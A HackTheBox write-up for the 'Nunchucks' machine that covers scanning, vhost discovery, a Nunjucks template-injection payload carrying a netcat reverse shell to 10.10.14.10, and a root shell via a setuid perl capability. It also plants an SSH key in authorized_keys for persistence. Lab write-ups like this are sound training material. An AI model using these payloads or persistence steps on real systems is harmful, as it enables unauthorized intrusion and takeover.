# Nunchucks

This is my write-up for the box **Nunchucks** on HackTheBox: [https://app.hackthebox.com/machines/Nunchucks](https://app.hackthebox.com/machines/Nunchucks).

nmap scan: `nmap -T4 -A -Pn 10.10.11.122 -oN nunchucks.nmap`

```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-19 15:24 EST
Nmap scan report for 10.10.11.122
Host is up (0.054s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.08 seconds
```

I had a hard time connecting to the website. I then updated my **/etc/hosts** file and it worked!

![](<../../.gitbook/assets/image (328).png>)

I then ran a `git clone` for the [Seclists](https://github.com/danielmiessler/SecLists) GitHub repository. This repo has a lot of different files which come in handy from directory/password brute-forcing. I did get stuck at this point, so I then looked at the HackTheBox walk-through from the site. I learned about the **gobuster** option of **vhosts** which checks for subdomains on the system:

`gobuster vhost -u https://nunchucks.htb/ -w directory-list-2.3-medium.txt -k`

This led me to discover a **store.nunchucks.htb**. In order to visit the site, I had to add the site to my **/etc/hosts** file. I manually edited the file using **nano**, but the walk-through had a much easier solution for this:

`echo "10.10.11.122 nunchucks.htb" | sudo tee -a /etc/hosts`

We end up on this page:

![](<../../.gitbook/assets/image (342) (1).png>)

I then ran **feroxbuster** on the website to see if there were directories that I can access:

![](<../../.gitbook/assets/image (344) (1).png>)

I didn't get that much of help from this. The walk-through mentioned that there is a template injection vulnerability on this site. I tested out the example they gave:

![](<../../.gitbook/assets/image (338).png>)

The walk-through mentioned BurpSuite's Repeater function. I was then testing out what I can inject using that in order to find out what system is on the backend:

![](<../../.gitbook/assets/image (329) (1).png>)

Using the following image from [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect), I was able to assume that the backend system was either **Jinja2** or **Twig**:

![](<../../.gitbook/assets/image (327) (1).png>)

![](<../../.gitbook/assets/image (341).png>)

After trying to get information from the system, I then went back to the write-up and found out that the server is using NodeJS Express. This is shown by the Response in Burp Suite:

![](<../../.gitbook/assets/image (339).png>)

The walk-through mentions how they found the website [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) by searching on Google. I searched on Google as well, but this website was not there in the results of a search. After this, the walk-through mentions running the following template injection (I modified it for my usage):

`{"email":"{{range.constructor("return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1234 >/tmp/f')")()}}@test.com"}`

I then got a reverse netcat connection:

![](<../../.gitbook/assets/image (332) (1).png>)

I then was able to read the user.txt file in david's home directory:

![](<../../.gitbook/assets/image (333).png>)

I then ran `script /dev/null bash` on recommendation from the walk-through. This gave me the shell (with the username and hostname). I then ran `getcap -r /`, again, on recommnedation of the write-up:

![](<../../.gitbook/assets/image (334) (1).png>)

The walk-through recommended using GTFObin's **perl** page.  It seemed that I was root, but was unable to read the root.txt file:

![](<../../.gitbook/assets/image (343).png>)

I was unable to get **nano** (text editor) to work as I wanted it to. I then added my own key to the **authorized\_keys** file that way I was able to get back into the machine. In order to do this I did the following (recommended by the write-up):

```
Local Machine:
run ssh-keygen (I entered defaults for everything)

Then copy the output of "id_rsa.pub" which is in your .ssh folder.

Remote Machine:
echo <id_rsa.pub> > ~/.ssh/authorized_keys

You can now SSH as david onto the machine
```

I was lost at this point, since the GTFObins commands were not getting me solid results. The write-up mentioned breaking down the `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` command to a script. This was the solution from the write-up:

![](<../../.gitbook/assets/image (330) (1).png>)

Once you run `chmod +x` on the file, you can then get root access.

![](<../../.gitbook/assets/image (340) (1).png>)

You then also have access to root.txt

![](<../../.gitbook/assets/image (331).png>)

